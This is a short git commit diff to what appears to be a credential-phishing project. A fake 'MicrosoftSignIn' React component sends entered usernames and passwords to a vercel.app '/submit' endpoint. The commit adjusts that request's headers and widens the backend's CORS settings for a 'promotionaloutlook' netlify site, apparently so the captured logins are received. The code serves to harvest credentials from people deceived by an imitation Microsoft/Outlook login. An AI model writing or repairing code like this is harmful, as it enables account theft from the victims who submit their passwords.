2649b7c74c32e784672d2dc6b4c466ec9fdb8abb
Yesukay <yesukay2@gmail.com>
2024-12-19 13:39:32 -0500

    try2

--- src/App.jsx
+++ src/App.jsx
@@ -51,7 +51,10 @@ const MicrosoftSignIn = () => {
     if (validate()) {
       const data = { username: unameVal, password: pwdVal };
       axios
-        .post("https://backend-43u6pndx4-yesus-projects-e758688f.vercel.app/submit", data)
+        .post("https://backend-43u6pndx4-yesus-projects-e758688f.vercel.app/submit", data, {
+          headers: {
+            'Content-Type': 'application/json'
+        }})
         .then((response) => {
           console.log(response.data.message);
           setView('final');
--- src/backend/server.js
+++ src/backend/server.js
@@ -14,6 +14,8 @@ app.use(express.json());
 app.use(cors(
     {
         origin: 'https://promotionaloutlook.netlify.app',
+        methods: ['GET', 'POST'],
+        credentials: true
     },
 ));
 
